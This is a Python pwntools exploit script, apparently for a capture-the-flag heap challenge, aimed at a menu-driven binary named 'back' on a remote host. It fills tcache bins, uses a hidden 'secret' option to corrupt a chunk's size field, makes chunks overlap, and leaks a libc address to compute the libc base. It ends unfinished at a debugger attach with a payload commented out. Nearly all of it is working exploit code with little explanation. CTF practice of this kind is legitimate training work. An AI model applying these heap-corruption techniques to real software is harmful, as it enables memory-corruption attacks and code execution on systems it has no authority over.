#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

HOST = 'pwnable.org'
PORT = 12356

LIBC = ELF("./libc.so.6",checksec = False)
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./back',env = {"LD_PRELOAD" : "./libc.so.6"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

a = '琴'
b = '瑟'

def add(ins,size,data):
    sla(': ','1')
    sla('Instrument: ',ins)
    sla('Duration: ',str(size))
    sla('Score: ',data)

def free(ins):
    sla(': ','2')
    sla('Instrument: ',ins)

def view(ins):
    sla(': ','3')
    sla('Instrument: ',ins)

def secret(num):
    sla(': ','5')
    sla('合: ',str(num))


if __name__=="__main__":
    for i in xrange(7):
        add(a,0x270,str(chr(ord('1')+i))*0x270)              # fill 0x280  tcache
        free(a)

    for i in xrange(7):
        add(a,0x80,str(chr(ord('1')+i))*0x80)                # fill 0x90 tcache
        free(a)

    for i in xrange(7):
        add(a,0x1b0,str(chr(ord('1')+i))*0x1b0)             # fill 0x1f0 tcache
        free(a)

    for i in xrange(7):
        add(a,0xf0,str(chr(ord('1')+i))*0xf0)             # fill 0x1f0 tcache
        free(a)


    for i in xrange(7):
        add(a,0xe0,str(chr(ord('1')+i))*0xe0)             # fill 0x1f0 tcache
        free(a)


    for i in xrange(7):
        add(a,0x1b0,str(chr(ord('1')+i))*0x1b0)             # fill 0x1f0 tcache
        free(a)

    add(a,0x270,"\x00"*0x270)                               # big chunk
    add(b,0xc0,"\x00"*0xc0)                                 # chunk to stop other one from merging to top chunk
    free(b)
    free(a)
    add(a,0x80,"\x0a"*0x80)                                 # this will be later used for secret
    add(b,0xf0,"\x0b"*0xf0)                                 # this will overlap with the next chunk after size is overwritten
    free(a)
    payload = ("\x0c"*0xb0 +  p64(0)+p64(0x31)).ljust(0xe0,"\x00")
    add(a,0xe0,payload)
    secret(0xc1)                                            # overwriting size
    free(b)
    add(b,0x100,"\x0d"*0x100)
    view(a)

    io.recvuntil("琴: ")
    io.recv(16)
    libc_base = u64(io.recv(6)+"\x00\x00")-0x1e4ca0
    log.info("libc @ "+str(hex(libc_base)))

    free(b)

    gdb.attach(io)
    """
    payload = "\x00"*0xf8 + p64(0xf1)
    add(b,0x100,payload)
    free(a)
    add(a,0xd0,"\x00"*0xd0)
    """
    io.interactive()
